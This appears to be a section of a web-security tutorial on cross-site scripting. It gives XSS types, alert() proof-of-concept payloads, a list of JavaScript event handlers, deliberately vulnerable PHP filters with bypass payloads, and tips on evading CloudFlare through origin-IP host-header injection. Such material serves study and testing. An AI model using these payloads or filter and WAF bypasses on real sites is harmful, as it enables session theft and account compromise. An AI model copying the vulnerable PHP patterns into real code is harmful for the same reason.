## 7. Cross Site Scripting (XSS)

![](https://miro.medium.com/v2/resize:fit:600/0*OgDrgZakNWFRIiIu.png)

**What is XSS attack?**

Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.

An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page. (Taken From OWASP)

**Four types of XSS**
```
1. Reflected XSS
2. Stored XSS
3. Dom XSS
4. Self XSS
```


**Simple 3 Ways to exeecute javascript in browser**

>Using Script Tag

```
<script>alert('Hello');</script>
```

>Using Events

```
<img src=noimg onerror=alert('Hello');>
```

>Call JavaScript Functions in URL

```
<a href='javascript:alert("Hello");'>Click me</a>
```

**HTML events that can be used to execute JavaScript**

```
onAbort
onBlur
onChange
onClick
onDblClick
onDragDrop
onError
onFocus
onKeyDown
onKeyPress
onKeyUp
onLoad
onMouseDown
onMouseMove
onMouseOut
onMouseOver
onMouseUp
onMove
onReset
onResize
onSelect
onSubmit
onUnload
onscroll
onbort
onmouseleave
oninput
```

## Bypass Methods

**Replacement Filter**

>Example PHP Code

```
<?php
$name = preg_replace('/script/i', '', $_GET['name']);
echo $name;
?>
```

>Bypass Payload (String in String)

```
<scrscriptipt>alert('Hello')</scrscriptipt>
```

**Bypass ()**

>Example PHP Code

```
<?php
$name = $_GET['name'];
$ban = array('\(', '\)');
foreach($ban as $banned){
while(preg_match( '/'.$banned.'/i', $name)){
$name = preg_replace('/'.$banned.'/i', '', $name);}}
echo $name; ?>
```

>Bypass Payload

```
alert`Hello`
```

**Tips For XSS**

>1. Allow Uploading HTML File Or Unknown File Extensions Lead To XSS in some browser. Bypass Extensions (html,htm.pngs,jpegs,txts)
>2. If target web is protected by CloudFlare.Find the real ip of this web and inject xss payloads with host header injection.
>3.We can perform CSRF and CORS attacks with XSS.
